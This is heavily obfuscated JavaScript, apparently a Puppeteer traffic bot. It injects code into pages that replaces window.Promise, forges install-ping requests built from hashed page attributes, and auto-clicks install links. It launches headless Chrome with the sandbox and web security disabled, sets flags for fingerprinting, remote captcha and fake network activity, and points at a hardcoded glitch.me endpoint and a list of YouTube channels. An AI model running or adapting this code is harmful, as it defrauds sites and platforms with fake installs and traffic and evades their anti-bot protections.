0x43 * 0x58 + -0x1 * -0x244d + -0x9d9 * 0x6 & L) << y[-0x2 * -0x1021 + -0x99 * -0x1d + 0x1 * -0x3194 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x833 * -0x1 + 0x2046 + -0x2839 ? (this['block'] = P[-0x4d7 * -0x5 + 0xb8 * -0x17 + -0x79b], this['start'] = N - (-0x15cf * -0x1 + -0xd65 * 0x1 + -0x82a), this['hash'](), this['hashed'] = 0x1 * -0x16b5 + -0x1ec6 + 0x2a * 0x146) : this['start'] = N;
                }
                return this['bytes'] > -0x1e8878293 + 0x52c4 * 0x3053 + -0x1f * -0x17835a3a && (this['hBytes'] += this['bytes'] / (-0x2317586 * 0xbc + -0x14a4 * -0x1206b4 + 0x1283ff318) << 0x82c + 0x19c6 + -0x37 * 0x9e, this['bytes'] = this['bytes'] % (0x144855464 + -0x1772c5f58 + -0x1 * -0x132a70af4)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x3 * -0x979 + 0x25e8 + 0x4be * -0x2;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x20d9 + -0x1d * -0x152 + -0x4bd * 0xf] = this['block'], J[K >> 0x6f7 * -0x4 + 0x2406 + -0x828] |= x[-0x1c79 * -0x1 + 0x18 * -0x182 + -0x2e * -0x2b & K], this['block'] = J[0x23c8 + 0x1427 + -0x37df], K >= -0x7 * 0x4a9 + 0x7 * 0x463 + 0xb6 * 0x3 && (this['hashed'] || this['hash'](), J[-0x816 + -0x89 * 0x2a + 0x1e9 * 0x10] = this['block'], J[-0x3e + 0x23b1 * 0x1 + -0x2363] = J[0x26a5 + 0x4bc + -0x20 * 0x15b] = J[-0x18 * -0xfe + 0x436 + -0x1c04] = J[-0x210e + 0x5c9 * -0x1 + 0x26da] = J[0x1077 + 0x1d1b + -0x2d8e] = J[0x123c + 0x7bb * 0x1 + 0x453 * -0x6] = J[0x7c * -0x3b + 0x20ed * 0x1 + -0x453] = J[0xa97 * -0x2 + 0x57 * -0x31 + -0x12ee * -0x2] = J[-0x1 * 0x123b + -0x1c1 + 0x1 * 0x1404] = J[-0x14cf + -0x2 * 0x904 + 0x9b8 * 0x4] = J[0x1c44 + 0x5b5 * 0x1 + -0x77 * 0x49] = J[0xa1 * -0x7 + -0x1ea8 + 0x231a * 0x1] = J[-0x89 * -0x2e + -0x6ef + 0x11a3 * -0x1] = J[0x2 * 0x1de + -0xafa + -0x1 * -0x74b] = J[0x1bf6 + -0x1477 + -0x17d * 0x5] = J[-0x4db + -0x534 + 0x206 * 0x5] = 0x2259 + -0x46a + -0x1def), J[-0x18a2 + 0xd * -0x53 + 0x1ce7] = this['hBytes'] << 0x608 + 0x2 * 0x20a + -0xa19 | this['bytes'] >>> 0x1c54 + -0x49 * -0x3d + -0x2d9c, J[0xba5 + 0x1850 + -0x23e6] = this['bytes'] << -0x1ae4 + -0x4 * -0x5e5 + 0x353 * 0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1 * -0x1b32 + -0x2 * -0xc83 + -0x3428; J < 0x1 * 0x92f + -0x406 + -0x11 * 0x49; ++J)
                K = Q[J - (0x1fb + -0x1db1 + 0x1bb9)] ^ Q[J - (-0xb08 + 0x183f + -0xd2f)] ^ Q[J - (-0xb99 * 0x3 + -0x1 * 0xd72 + 0x304b)] ^ Q[J - (-0x2192 + -0x5bd + -0x275f * -0x1)], Q[J] = K << 0xf7a + 0xd97 + -0x1d10 | K >>> -0x1 * 0x55b + 0x17b * 0x10 + -0x1236;
              for (J = 0xed5 * 0x2 + 0x1b00 + -0x38aa * 0x1; J < -0x745 + 0x32d * -0x6 + 0x9 * 0x2ef; J += -0x266d * 0x1 + 0x1a2 + 0x7c * 0x4c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x1243 + 0x1fb5 * -0x1 + 0xd77 | L >>> -0x172b + 0x407 * 0x2 + 0x4 * 0x3ce) + (M & N | ~M & O) + P + (-0x45 * -0xc61109 + -0x4409a04f * -0x1 + -0x1ee9be23) + Q[J] << 0x7c1 * -0x2 + 0x845 * -0x2 + 0x200c) << 0x2166 + -0x2619 + 0x4b8 | P >>> 0x1 * -0x116d + -0xe00 + 0x2 * 0xfc4) + (L & (M = M << 0x2 * 0xc3e + 0x5 * -0xdb + -0x1417 | M >>> -0x1ebd + -0x197c + 0x383b) | ~L & N) + O + (0x49efe4a3 + 0x2ca7609 * -0x3f + 0xc065a12d) + Q[J + (-0x2 * 0xe9a + -0x213b + 0x3e70)] << 0x1 * -0x150b + 0x4a7 * 0x4 + 0x26f) << 0x1e5c + 0x1782 + 0x397 * -0xf | O >>> 0x11e3 * 0x1 + 0x2627 * -0x1 + 0x145f) + (P & (L = L << -0x552 + 0x1d62 + -0x17f2 | L >>> -0x135 * -0x1 + -0xe * 0x1bb + 0x1707) | ~P & M) + N + (-0xf94a * 0x4747 + -0x4e271 * 0x1d3f + -0x12ec5a9ee * -0x1) + Q[J + (0xbba + 0x1cb8 + 0x10 * -0x287)] << -0x2 * 0x1a3 + -0x1607 * -0x1 + -0x1 * 0x12c1) << 0x8cb + 0x2d * 0x7f + -0x1f19 | N >>> 0x886 * -0x1 + -0x4 * 0x1a3 + 0xf2d) + (O & (P = P << -0x3 * -0x3f3 + 0x123 * -0x17 + 0xe6a | P >>> 0x17f3 * 0x1 + -0x11 * -0x22 + -0x161 * 0x13) | ~O & L) + M + (-0x4ea1f6d0 + 0x2f832c9a + 0x1 * 0x79a143cf) + Q[J + (0x3 * -0x6e3 + -0x17ab * -0x1 + -0x1 * 0x2ff)] << 0x1145 * -0x1 + 0x154 + 0xff1) << 0x2053 + 0x113b * -0x1 + -0xf13 | M >>> -0x14fd + -0x143d + 0x2955) + (N & (O = O << 0x165d * -0x1 + -0x1383 * 0x1 + -0xfa * -0x2b | O >>> -0x2 * 0x732 + 0x13 * 0x1d6 + -0x147c) | ~N & P) + L + (-0x6cd360f8 + 0x1e7cd * 0x62e + 0xbb8f65bb) + Q[J + (0x164 * -0x1a + -0xe25 * 0x2 + 0x4076)] << 0xaaa + 0x1e * -0x25 + -0x654, N = N << -0x2594 + 0x55 * 0x55 + 0x979 | N >>> -0x687 + -0x269c * -0x1 + -0x15 * 0x187;
              for (; J < -0xd * -0x35 + -0x1095 * 0x1 + 0xe0c; J += 0x989 * 0x1 + -0x34 * 0x26 + -0x1cc)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x873 * -0x1 + -0xdfe + 0x590 | L >>> 0xde3 + 0x1 * -0x1ee3 + 0x111b) + (M ^ N ^ O) + P + (0x43c8a20a + 0x10 * 0xba56807 + 0x7 * -0x14779a1f) + Q[J] << -0x3 * 0xc29 + 0x7 * -0x2e1 + -0x2 * -0x1c51) << 0x175 * -0x8 + -0x18 * 0x2f + 0x1015 | P >>> 0x2023 + -0x1f * 0x13a + -0x3b * -0x1a) + (L ^ (M = M << 0xf5b * 0x1 + 0x2593 + 0x8 * -0x69a | M >>> -0x12f9 + -0x1091 * -0x1 + -0x67 * -0x6) ^ N) + O + (-0xdda3d1cc + -0x77f2dbfb + 0x388e132d * 0x8) + Q[J + (0xa0f * 0x2 + -0x47 * -0x6f + -0xa2e * 0x5)] << 0x8c * -0x28 + 0x155 * 0x2 + -0x99b * -0x2) << -0x148d + 0xdd * -0x2a + -0x4 * -0xe35 | O >>> 0x8 * -0x10d + 0x105b + -0x7d8) + (P ^ (L = L << -0x1f9 + -0x418 * -0x9 + -0x22c1 | L >>> 0xa89 * 0x2 + 0x281 + -0x1791) ^ M) + N + (0x57a2aeac + -0x51cb86d7 + 0x6902c3cc) + Q[J + (-0x8bf * 0x1 + 0x1412 + -0xb51)] << 0x18be * -0x1 + -0x753 + 0x2011 * 0x1) << -0x1 * -0x1753 + 0x328 + -0x1a76 | N >>> -0x64a + 0x7d * -0x4 + 0x1 * 0x859) + (O ^ (P = P << 0x2 * -0xd4b + 0x1e3c + -0x388 | P >>> -0x25db * -0x1 + 0x85c * -0x1 + -0x1 * 0x1d7d) ^ L) + M + (0x10a * 0xd2e55d + -0x1 * -0x5541a4cb + -0xd9c * 0xe3895) + Q[J + (-0x1343 * 0x2 + -0x2 * -0x125d + 0x1cf)] << 0x395 * 0x7 + -0xd * 0xd1 + -0xe76) << -0x116e + 0x1 * 0x367 + -0x74 * -0x1f | M >>> 0x23ca + -0x59 * 0x5 + -0x37 * 0x9e) + (N ^ (O = O << -0x8a7 + -0x12df + 0x1ba4 | O >>> 0x1 * -0x50b + -0x16c0 + 0x1bcd) ^ P) + L + (0xd7fd8766 + 0x519154c3 * 0x1 + 0x40f105c * -0x2e) + Q[J + (-0x1ed1 + -0x5c + 0x1f31)] << 0x1 * 0x3d + -0x206 + 0x1c9 * 0x1, N = N << 0x9f2 * 0x1 + -0x2 * -0x11f5 + 0x1 * -0x2dbe | N >>> -0x1 * 0x13a5 + 0x1 * -0x1e71 + 0x3218;
              for (; J < 0x25fd + -0x239 * -0xd + -0x42a6; J += 0x11f6 + 0xf9 * 0x18 + 0x3 * -0xdc3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x7 * -0x9b + -0x19c0 + 0x1588 | L >>> 0x2089 + -0x20 * -0xc1 + 0x96d * -0x6) + (M & N | M & O | N & O) + P - (-0x40419eae + -0x65cf4a05 + -0x1 * -0x116f52bd7) + Q[J] << -0x1 * -0x191c + 0x14 * -0x22 + -0x2 * 0xb3a) << 0x1942 + 0x371 * 0x9 + -0x3836 | P >>> -0x8bd * 0x3 + -0x1b80 + -0x1ae9 * -0x2) + (L & (M = M << -0x19 * 0x2 + -0x1 * -0xf6e + -0x5a * 0x2b | M >>> -0x1661 * 0x1 + -0xdfd + -0x918 * -0x4) | L & N | M & N) + O - (0x88f2a033 + 0x379540c0 * 0x3 + -0xbece1f4f) + Q[J + (0x255b + -0x5 * 0x7bd + 0x7 * 0x31)] << -0x1 * -0x66e + -0x1 * -0x1a57 + -0x20c5) << -0xb * -0x63 + -0x21bf + 0x1d83 | O >>> -0x32a * 0x3 + -0x1b9e + 0x2537) + (P & (L = L << 0x5e * -0x2b + -0xc25 + 0x1c0d | L >>> 0x17f5 + -0x15c6 + 0x22d * -0x1) | P & M | L & M) + N - (0x149c1e5 * 0x5f + 0x9b410c6b + -0x1c96 * 0x5c343) + Q[J + (0x1 * 0x1e2b + -0x26e * 0xa + -0x4f * 0x13)] << 0x6 * 0x95 + -0x16f9 + 0x137b) << -0x3 * -0x935 + 0x1 * 0x73c + -0x22d6 | N >>> 0x2 * 0xbe8 + -0xb24 * -0x1 + -0x22d9) + (O & (P = P << 0x194b + 0xe8d + -0x153 * 0x1e | P >>> 0x1742 + -0xe79 * -0x1 + -0x1 * 0x25b9) | O & L | P & L) + M - (-0x29eb7b8b + 0x639cea5 * 0x2 + -0xffb3 * -0x8e87) + Q[J + (-0x1888 + 0x15b9 + 0x1 * 0x2d2)] << -0x21e3 + -0x1343 + 0x3526) << 0xe * 0x64 + 0x1462 + -0x185 * 0x11 | M >>> -0x533 * 0x3 + -0x11 * 0xe + 0x851 * 0x2) + (N & (O = O << -0x1ec2 + -0x1 * -0xa97 + 0x1 * 0x1449 | O >>> -0x1966 * -0x1 + -0x76a + -0x11fa) | N & P | O & P) + L - (0x44ad9d4 * 0x22 + 0x6604a492 + 0xba * -0xb9e647) + Q[J + (0x981 + -0xfd4 + 0x657)] << -0x265 + -0x22eb * 0x1 + 0x6 * 0x638, N = N << -0x4 * -0x3f1 + 0xd * 0x2a9 + -0x323b * 0x1 | N >>> -0x1 * -0x709 + -0x1cba + 0x37 * 0x65;
              for (; J < 0x1721 + 0x9c6 * 0x1 + -0x2097; J += 0x13f4 + -0xa80 + 0x325 * -0x3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x1121 + 0xd7 * 0x16 + 0x11 * -0x14 | L >>> 0xf * -0x196 + -0x110 * -0xe + 0x905) + (M ^ N ^ O) + P - (0x36c6f6a4 + 0x652a5440 + 0x15 * -0x4df6e52) + Q[J] << 0x383 + 0xc0 * 0x2 + -0x503) << -0x2377 + -0x31 * 0x19 + -0x1 * -0x2845 | P >>> -0x669 * -0x5 + -0x4 * 0x725 + 0x35e * -0x1) + (L ^ (M = M << -0x855 + 0xff * 0xb + 0x3 * -0xd6 | M >>> 0x6b9 + -0x18bc + 0x293 * 0x7) ^ N) + O - (-0x5723bffe + -0x449f265 + -0x1 * -0x910af08d) + Q[J + (-0xb * 0x1fc + -0x14ea + 0x2abf)] << 0xf0 + -0x1 * 0x1f39 + 0x1e49) << 0xc58 + 0x1634 + 0x1 * -0x2287 | O >>> 0xd * 0x62 + 0x1bb3 + 0x2 * -0x1049) + (P ^ (L = L << -0x4 * 0x21f + -0x56 * -0x5e + -0x16fa * 0x1 | L >>> 0xa5f + -0x3d * -0x88 + -0x1 * 0x2ac5) ^ M) + N - (-0x63eb01d2 + -0x1e31efe3 + 0xb7ba2fdf) + Q[J + (0x1604 + 0x613 + -0x1c15)] << 0x258c + 0xd83 + 0x1 * -0x330f) << 0xb61 + 0x1e73 + 0x7 * -0x5f9 | N >>> 0x54b + -0x2251 + -0x1d21 * -0x1) + (O ^ (P = P << 0x1 * -0x2597 + 0x4ad + -0x1 * -0x2108 | P >>> -0x1fa7 + -0x1 * -0xe05 + -0x8d2 * -0x2) ^ L) + M - (0x65285d18 + -0x13771ae3 + 0x95c0159 * -0x3) + Q[J + (0x5df + 0x134a + -0x6 * 0x431)] << 0x1ed0 + 0x9d3 * -0x3 + -0x157) << -0x1006 * -0x2 + -0x3d * 0x67 + -0x3be * 0x2 | M >>> -0x1f48 + 0x6c * 0x54 + -0x40d) + (N ^ (O = O << 0x233e + -0x11 * -0x7a + -0x2b3a | O >>> -0x175f * -0x1 + 0x8b1 + -0x200e) ^ P) + L - (-0x50738386 + 0x1 * -0x17ebc64d + 0x3da73b5 * 0x29) + Q[J + (-0xb52 + -0xf4d + -0x8e1 * -0x3)] << 0xa61 + -0x82 * -0x3e + -0x29dd, N = N << -0x677 + -0x1a3a + 0x1 * 0x20cf | N >>> -0x2307 + 0x1 * 0x1b3d + 0x7cc;
              this['h0'] = this['h0'] + L << 0x4fd + -0x1 * 0x1f0d + 0x116 * 0x18, this['h1'] = this['h1'] + M << 0x1 * -0xf5b + 0xc46 + 0x315, this['h2'] = this['h2'] + N << 0x1736 + -0x103b + -0x6fb, this['h3'] = this['h3'] + O << 0xfbe + 0x3c9 * -0x5 + -0x1 * -0x32f, this['h4'] = this['h4'] + P << 0x1fd7 + 0x20c2 + -0x4099;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x5 * -0x41f + 0x5d * -0x3 + 0x15ce & -0x18c4 + 0x1 * 0x1b3d + -0x26a] + w[J >> 0x3 * 0x655 + -0x93 * 0x7 + -0xee2 & 0x261d + -0x153a + -0x10d4] + w[J >> 0x15d * 0x1a + -0x1b * -0xd + -0x24bd & 0x1 * 0x1afe + 0x2 * -0x7bd + -0xb75] + w[J >> -0xa7 * 0x15 + -0xb79 + -0x14 * -0x143 & -0x4 * -0x773 + -0x84f * 0x2 + -0xd1f] + w[J >> 0xdcf * 0x1 + 0x614 + -0x69d * 0x3 & 0x69a + -0x1026 + 0x99b] + w[J >> 0x1a35 + 0x1 * 0x1dc5 + -0x5d * 0x9a & 0x1f76 + -0x263 + -0x4d6 * 0x6] + w[J >> 0x808 * 0x1 + 0x2 * 0x622 + -0x1448 & 0x19b9 + -0x13a * 0x5 + -0x1388] + w[-0x1ace + 0x25e * 0xb + -0xd3 * -0x1 & J] + w[K >> 0x10ea + 0x7 * 0x2f5 + -0x2581 & -0x10ec + 0x1b3 + 0xf48] + w[K >> 0x237 * 0x2 + -0x41 * -0x1e + -0xb4 * 0x11 & -0x52f + -0x263d + 0x2b7b] + w[K >> 0x1 * 0x785 + 0x1b * -0xed + 0x118e & -0xe2f + 0x141d + -0x5df] + w[K >> 0x6 * 0x1af + -0x1 * -0x1723 + -0x212d & -0x155a + 0x1f59 + -0x9f0] + w[K >> 0x1 * -0xb5 + -0x134e + -0xd * -0x18b & 0xadc + -0x1b7e + 0x10b1] + w[K >> -0x11f1 * -0x1 + -0x1cd * 0x13 + 0x1 * 0x104e & 0x1 * -0x1feb + 0x11 * 0x163 + 0x867] + w[K >> 0x1493 + 0x1c10 * 0x1 + -0x1b * 0x1cd & 0x2597 + 0x116d + -0xb * 0x4ff] + w[-0xf47 + -0x6c2 + 0x65 * 0x38 & K] + w[L >> -0x199a + 0x15d * -0x1 + 0x1b13 & 0x889 + 0x24f * -0x9 + 0xc4d] + w[L >> -0x22e6 + 0x1b93 + -0x9 * -0xd3 & -0xd4e + 0x1 * -0x316 + -0x1 * -0x1073] + w[L >> -0x1 * 0x113f + -0x2649 + 0x379c & 0x24b1 + -0x10fa + -0x13a8] + w[L >> -0x619 + -0x2 * -0x18e + 0x30d & 0x11 * -0x1bd + 0x1a * -0x25 + -0x1 * -0x215e] + w[L >> -0x4f4 + 0x25c3 + -0x20c3 * 0x1 & -0x2 * -0x97a + 0x95 * -0x12 + -0x86b] + w[L >> -0x1583 + 0x1 * -0x17cc + 0x2d57 & -0x231b + -0x15c5 + 0x52d * 0xb] + w[L >> -0xd14 + 0x446 + 0x469 * 0x2 & -0xb49 + -0x20f * -0x2 + 0x73a] + w[0x967 * 0x2 + 0x1fda + 0x3299 * -0x1 & L] + w[M >> 0xdc2 * -0x2 + 0x1195 + 0xa0b & 0x372 + -0x6 * -0xf1 + -0x909] + w[M >> -0x3cc * 0x5 + 0x26a + 0x10aa & 0x9e * 0xc + 0x20bd + 0x1 * -0x2816] + w[M >> -0x14b5 + -0x1 * 0x15bb + -0x2 * -0x1542 & 0xc97 * 0x1 + -0x2e * -0xbc + -0x2e50] + w[M >> 0x1 * 0x11dd + -0x2a1 + -0xf2c & 0x8 * -0x38d + -0x53 * 0x1a + 0x761 * 0x5] + w[M >> -0x1 * -0x1a2d + 0xe6 * -0x29 + -0x1 * -0xab5 & -0x6f * 0x49 + 0xa7 * -0x25 + -0x1ed * -0x1d] + w[M >> 0x21c4 + -0x1c2 * -0xa + -0x3350 & -0x2454 + 0x193d + -0x1 * -0xb26] + w[M >> 0x68b + -0x13 * 0x96 + 0x3 * 0x189 & -0x1835 * -0x1 + 0x1cf1 + 0x3517 * -0x1] + w[0x1788 + -0x182b + 0xb2 * 0x1 & M] + w[N >> -0x30c * 0x1 + 0x12a7 + -0xf7f & -0x5a * -0x3e + 0x1211 + -0x7f6 * 0x5] + w[N >> 0x1a87 + -0x37c * -0x5 + -0x2bdb & -0x1 * -0x1b37 + -0x5ef * 0x5 + 0x283] + w[N >> -0xb * -0x22d + -0x1c97 * 0x1 + 0x4bc & -0x2d8 + 0xe44 * 0x2 + -0x19a1] + w[N >> -0xac9 + 0x1 * -0x1bbf + 0x2f8 * 0xd & 0x3e3 * 0x8 + 0x197 * -0x3 + 0x1a44 * -0x1] + w[N >> 0x16 * -0xbe + 0x1713 + -0x6b3 * 0x1 & 0x29 + -0x1 * -0x102a + -0x1044] + w[N >> -0x156a + 0x2387 + -0xe15 & -0x2601 + 0x107 + -0x1 * -0x2509] + w[N >> -0x20a3 + -0x8d * -0x4 + 0x1e73 & 0xd2 + -0x26fe + 0x263b] + w[-0xa03 + -0x1258 + -0x1c6a * -0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x151b + 0xfe3 + 0x10 * 0x55 & -0x1 * 0x5f2 + 0xe4f + -0x29 * 0x2e,
                J >> -0xe09 * 0x1 + -0xb30 * 0x1 + 0x1949 & -0x1300 * -0x1 + 0x1e34 * -0x1 + 0xc33,
                J >> 0x8de * -0x2 + -0x64b * -0x4 + -0x13c * 0x6 & 0x109d + -0x1 * 0x35b + -0x2b * 0x49,
                0x1cbd + 0x1 * 0xd72 + -0x2930 & J,
                K >> 0x15c4 + -0x1 * 0x1f45 + 0x999 & 0xf * 0xfb + -0xea5 + 0xef * 0x1,
                K >> 0x6 * 0x101 + -0xb * 0xd4 + -0x1 * -0x326 & 0x1ce * -0x6 + -0xa * -0x99 + 0x3 * 0x1f3,
                K >> -0x11 * 0xf1 + -0xa35 + 0x1a3e & 0x22f + -0xa * 0x189 + 0xe2a,
                -0x1 * 0x815 + -0x2465 + -0x67f * -0x7 & K,
                L >> 0x25d6 + -0x669 * -0x1 + -0x1 * 0x2c27 & -0xc * 0x17b + 0x3 * -0x337 + 0x1c68,
                L >> -0x1276 + -0x83a * 0x4 + -0x1 * -0x336e & 0x4ce + -0xf9b + 0xbcc,
                L >> -0x4 * 0x967 + -0xe48 + 0x33ec & 0x259f + 0x1af * 0x6 + -0x1 * 0x2eba,
                0x1 * -0x2692 + 0x17b0 + 0xfe1 & L,
                M >> -0xb * 0xbb + 0x541 * -0x5 + 0x22 * 0x103 & 0x1 * 0xecf + -0x537 * 0x5 + 0xc43,
                M >> -0x1e50 + 0x1145 + -0xd1b * -0x1 & 0x5e * -0x5b + 0x2618 + -0x3af,
                M >> -0x5f2 * 0x3 + 0x5a5 * 0x2 + 0x694 & -0x2 * 0xaa3 + 0x1ea5 + -0x86 * 0x10,
                0x6 * 0x1b8 + -0x7fa * -0x1 + -0x114b & M,
                N >> 0x2 * 0xa5e + 0x248f + -0x1 * 0x3933 & -0xe5 * -0x4 + 0x1 * -0x962 + 0x6cd,
                N >> 0x1027 + 0x2122 + 0x1 * -0x3139 & -0x24c1 + 0x1b * 0xb7 + 0x1273,
                N >> 0x126 * 0x1 + 0x2 * -0x6e6 + 0xcae & 0x5c8 + 0x3 * -0x98f + 0x17e4,
                0xdc5 + -0x13a1 + 0x6db & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0xfbb * -0x2 + -0x864 + -0x16fe), (K = new DataView(J))['setUint32'](-0x21aa + -0x16b9 + 0x3863, this['h0']), K['setUint32'](0xd93 + -0x1e96 + -0x5ad * -0x3, this['h1']), K['setUint32'](-0x1 * 0x225f + -0x11a1 * -0x1 + 0x13 * 0xe2, this['h2']), K['setUint32'](0x2b * -0xa7 + 0x11 * -0x35 + 0x1f9e, this['h3']), K['setUint32'](0x211b * -0x1 + -0x16fb + 0x1c13 * 0x2, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1c72 + 0x159d + 0xe9 * -0x37];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x17be * -0x1 + -0x2 * -0x32f + 0x5e * -0x52;
            J[-0xed3 + -0x1 * 0xb1b + 0x19ee * 0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x4 * -0x9a3 + -0x19b5 * 0x1 + 0x1 * -0xcd7] = L => {
              const Y = b;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1 * -0x19c + -0x11e + -0x5 * 0x19), O[Y(0x9, '8boQ') + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1fc4 + 0xe7 * 0x29 + 0x1be * -0x3;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x25d3 + -0x11 * -0x20f + -0x10 * -0x8b), Promise['resolve'](-0x57f + -0x8ac + -0x38b * -0x4);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x247b + -0x15a2 + 0x3a1d; j < 0x56e + -0x10ce + 0x3cb * 0x3; j++)
    i();
}
const NETWORK_PATIENCE = -0x2d70 * -0x1 + 0x37d0 + -0x5 * 0xe00 + (-0x1572 + -0x2 * 0x911 + -0x7 * -0x754) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1b6b + 0x203a + -0x22 * 0x1c1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + Z(0x6, '2Ew8') + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1453 + 0x12c7 + 0x18c; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const a1 = c,
      a0 = b;
    let i = this[floor(random() * this[a0(0x2, '8Cqf')])];
    f['has'](h) || f['set'](h, new Set());
    const j = f[a1(0x18)](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function a() {
  const bs = [
    'WP/dSSkDCxRcLqi',
    'easyfork.o',
    'W6KKESkCWRRdPW',
    'catch',
    'q8kqoIqHW5CXW5vmpG',
    'close',
    'EXxdQWJcLLyqfwO5',
    'Ahr0Chm6lY9NCG',
    '.com',
    'bMqpDZHyW4fYW49y',
    'W4NcLmoXDbpcS1pcQcBdQG',
    'ChrZlZKWotaTEq',
    'tify',
    'W4exW4S1nJ7cUSkZW5Wk',
    'nJK4owm2zwe0nW',
    'zxzHBhvHDgu',
    'k5gjnjDFAZ',
    'i8kHrthdGXKgWQ/dSKC',
    'vCoJWOC7bCo2A8kcw3q',
    'WPGjW4CQkcJcLSkkW5ul',
    'xmkwWOVdU8k6WRnweuldUa',
    'iSk+dxxdG1jmWQtdRa8',
    '.36\x20(KHTML',
    'CMfUzg9T',
    'z2v0',
    'ca119188bd',
    'ntm3lJm2',
    'BwfW',
    'fSowWOGejSovvCk6gd8',
    'du/cGSon',
    'hratWQraW5ddUxeRW6m',
    '_Mb8oQtSBW',
    ',\x20\x22Chromiu',
    'WRpcKtxcLNvdWO3dJG',
    'zg9tB3vUzenSBW',
    'W6O5W5apBX3cICkRW5qt'
  ];
  a = function() {
    return bs;
  };
  return a();
}
